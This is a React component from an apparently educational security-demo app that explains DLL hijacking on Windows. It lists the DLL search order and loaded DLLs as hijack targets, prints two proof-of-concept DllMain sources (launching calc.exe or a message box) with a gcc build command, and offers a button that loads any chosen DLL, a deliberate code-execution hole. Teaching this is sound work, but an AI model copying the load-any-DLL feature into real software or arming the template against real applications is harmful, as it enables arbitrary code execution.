import React, { useState } from 'react'
import { FaExclamationTriangle } from 'react-icons/fa'

export const DllHijackingDemo = () => {
  const [dllInfo, setDllInfo] = useState<{
    infoFilePath: string
    appPath: string
    userDataPath: string
    loadedDlls: string[]
  } | null>(null)

  const [loading, setLoading] = useState(false)
  const [activeTab, setActiveTab] = useState<'info' | 'loaded' | 'exploit' | 'live-demo'>('info')
  const [dllLoadResult, setDllLoadResult] = useState<any>(null)
  const [loadingDll, setLoadingDll] = useState(false)

  const runDemo = async () => {
    setLoading(true)
    try {
      const result = await window.context.dllHijackDemo()
      if (typeof result === 'string') {
        const parsedResult = JSON.parse(result)
        setDllInfo(parsedResult)
      } else {
        setDllInfo(result)
      }
    } catch (error) {
      console.error('Error running DLL hijacking demo:', error)
    } finally {
      setLoading(false)
    }
  }

  const handleLoadDll = async () => {
    setLoadingDll(true)
    try {
      const result = await window.context.loadDll()
      setDllLoadResult(result)
    } catch (error) {
      console.error('Error loading DLL:', error)
    } finally {
      setLoadingDll(false)
    }
  }

  return (
    <div className="p-4 bg-zinc-900 rounded-lg">
      <h2 className="text-xl font-bold mb-4 text-yellow-500">DLL Hijacking Vulnerability Demo</h2>
      <p className="mb-4 text-zinc-300">
        DLL Hijacking occurs when Windows loads DLLs from insecure locations. Attackers can place
        malicious DLLs in these locations to execute code with the application&apos;s privileges.
      </p>

      <div className="mb-6">
        <button
          onClick={runDemo}
          disabled={loading}
          className="px-4 py-2 bg-yellow-600 hover:bg-yellow-700 rounded-md font-medium transition-colors disabled:opacity-50"
        >
          {loading ? 'Analyzing...' : 'Analyze DLL Loading'}
        </button>
      </div>

      {dllInfo && (
        <div className="bg-zinc-800 rounded-lg p-4">
          <div className="flex gap-2 mb-4 border-b border-zinc-700">
            <button
              className={`px-3 py-1 ${activeTab === 'info' ? 'border-b-2 border-yellow-500 text-yellow-500' : 'text-zinc-400'}`}
              onClick={() => setActiveTab('info')}
            >
              Search Paths
            </button>
            <button
              className={`px-3 py-1 ${activeTab === 'loaded' ? 'border-b-2 border-yellow-500 text-yellow-500' : 'text-zinc-400'}`}
              onClick={() => setActiveTab('loaded')}
            >
              Loaded DLLs
            </button>
            <button
              className={`px-3 py-1 ${activeTab === 'exploit' ? 'border-b-2 border-yellow-500 text-yellow-500' : 'text-zinc-400'}`}
              onClick={() => setActiveTab('exploit')}
            >
              Exploitation
            </button>
            <button
              className={`px-3 py-1 ${activeTab === 'live-demo' ? 'border-b-2 border-red-500 text-red-500' : 'text-zinc-400'}`}
              onClick={() => setActiveTab('live-demo')}
            >
              Live Demo
            </button>
          </div>

          {activeTab === 'info' && (
            <div>
              <h3 className="text-lg font-semibold mb-2">DLL Search Order:</h3>
              <ol className="list-decimal ml-5 mb-3 space-y-1">
                <li>The directory from which the application loaded</li>
                <li>System directory (C:\Windows\System32)</li>
                <li>16-bit system directory (C:\Windows\System)</li>
                <li>Windows directory (C:\Windows)</li>
                <li>Current working directory (CWD)</li>
                <li>Directories in the PATH environment variable</li>
              </ol>

              <h3 className="text-lg font-semibold mb-2 mt-4">Application Paths:</h3>
              <div className="bg-zinc-900 p-3 rounded mb-3 font-mono text-sm">
                <p>
                  <span className="text-yellow-400">App Directory:</span> {dllInfo.appPath}
                </p>
                <p>
                  <span className="text-yellow-400">User Data:</span> {dllInfo.userDataPath}
                </p>
                <p>
                  <span className="text-yellow-400">Info File:</span> {dllInfo.infoFilePath}
                </p>
              </div>
            </div>
          )}

          {activeTab === 'loaded' && (
            <div>
              <h3 className="text-lg font-semibold mb-2">Currently Loaded DLLs:</h3>
              <p className="text-sm mb-2">This application is currently using these DLLs:</p>
              <div className="bg-zinc-900 p-3 rounded max-h-52 overflow-y-auto font-mono text-sm">
                <ul className="list-disc ml-5">
                  {dllInfo.loadedDlls.map((dll, index) => (
                    <li key={index} className="mb-1">
                      {dll}
                    </li>
                  ))}
                </ul>
              </div>
              <p className="text-xs mt-2 italic">These are potential targets for hijacking.</p>
            </div>
          )}

          {activeTab === 'exploit' && (
            <div>
              <h3 className="text-lg font-semibold mb-2">How DLL Hijacking Works:</h3>
              <div className="mb-4">
                <p className="mb-2">An attacker could exploit this vulnerability by:</p>
                <ol className="list-decimal ml-5 space-y-1">
                  <li>Identifying a DLL that the application loads</li>
                  <li>Creating a malicious version with the same name</li>
                  <li>Placing it in a location with higher search priority</li>
                </ol>
              </div>

              <div className="bg-red-900/20 border border-red-800 p-3 rounded mt-4">
                <h4 className="font-bold text-red-400">Example Attack Scenario:</h4>
                <p className="mt-1">
                  If this application loads <code>example.dll</code> from its own directory:
                </p>
                <pre className="bg-zinc-900 p-2 mt-2 rounded text-xs overflow-x-auto">
                  {`// Malicious example.dll
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Execute malicious payload
        WinExec("calc.exe", SW_SHOW);  // Launch calculator as proof
    }
    return TRUE;
}`}
                </pre>
                <p className="mt-2 text-sm">
                  Placing this in a higher priority location would execute the attacker&apos;s code.
                </p>
              </div>
            </div>
          )}

          {activeTab === 'live-demo' && (
            <div>
              <div className="bg-red-900/30 border border-red-900 p-3 rounded mb-4">
                <div className="flex items-start">
                  <FaExclamationTriangle className="text-red-500 mt-1 mr-2 flex-shrink-0" />
                  <div>
                    <h3 className="font-bold text-red-400">Warning: Educational Purpose Only</h3>
                    <p className="mt-1 text-sm">
                      This demonstration will attempt to load an actual DLL file from your system.
                      This is highly dangerous in real applications and would allow attackers to
                      execute arbitrary code. Use only for educational purposes.
                    </p>
                  </div>
                </div>
              </div>

              <div className="mb-4">
                <button
                  onClick={handleLoadDll}
                  disabled={loadingDll}
                  className="px-4 py-2 bg-red-600 hover:bg-red-700 rounded-md font-medium transition-colors disabled:opacity-50"
                >
                  {loadingDll ? 'Loading DLL...' : 'Select & Load DLL'}
                </button>
                <p className="text-xs mt-1 text-zinc-400">
                  Select any DLL file to demonstrate the vulnerability
                </p>
              </div>

              {dllLoadResult && (
                <div className="bg-zinc-900 rounded p-3 mt-4">
                  <h4 className="font-bold mb-2">
                    {dllLoadResult.success ? (
                      <span className="text-red-500">DLL Loaded Successfully (VULNERABLE!)</span>
                    ) : (
                      <span className="text-yellow-500">DLL Load Failed (Protected)</span>
                    )}
                  </h4>

                  <div className="text-sm">
                    <p>
                      <span className="text-zinc-400">Path:</span> {dllLoadResult.dllPath}
                    </p>
                    {dllLoadResult.functions && dllLoadResult.functions.length > 0 && (
                      <>
                        <p className="mt-2 text-zinc-400">Exposed Functions:</p>
                        <ul className="list-disc ml-5">
                          {dllLoadResult.functions.map((fn: string) => (
                            <li key={fn} className="text-yellow-500">
                              {fn}
                            </li>
                          ))}
                        </ul>
                        <p className="mt-2 text-red-400">
                          These functions could now be called by the attacker!
                        </p>
                      </>
                    )}

                    {dllLoadResult.error && (
                      <p className="mt-2">
                        <span className="text-zinc-400">Error:</span> {dllLoadResult.error}
                      </p>
                    )}

                    <p className="mt-3 text-zinc-400">
                      Log file created at:{' '}
                      <span className="text-zinc-300">{dllLoadResult.logPath}</span>
                    </p>
                  </div>
                </div>
              )}

              <div className="mt-6">
                <h3 className="text-lg font-semibold mb-2">How to Create a Test DLL</h3>
                <ol className="list-decimal ml-5 space-y-1 text-sm">
                  <li>Create a new C/C++ file called malicious.c</li>
                  <li>Add the following code:</li>
                </ol>

                <pre className="bg-zinc-900 p-2 mt-2 rounded text-xs overflow-x-auto">
                  {`#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // This code runs when the DLL is loaded
        MessageBoxA(NULL, "DLL Successfully Hijacked!", "Security Demo", MB_OK | MB_ICONWARNING);
        
        // In a real attack, more malicious actions would happen here
        // system("start calc.exe");  // Launch calculator as demonstration
    }
    return TRUE;
}`}
                </pre>

                <ol start={3} className="list-decimal ml-5 space-y-1 text-sm mt-2">
                  <li>
                    Compile with: <code>gcc -shared -o malicious.dll malicious.c</code>
                  </li>
                  <li>Load this DLL using the button above to see the attack in action</li>
                </ol>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  )
}
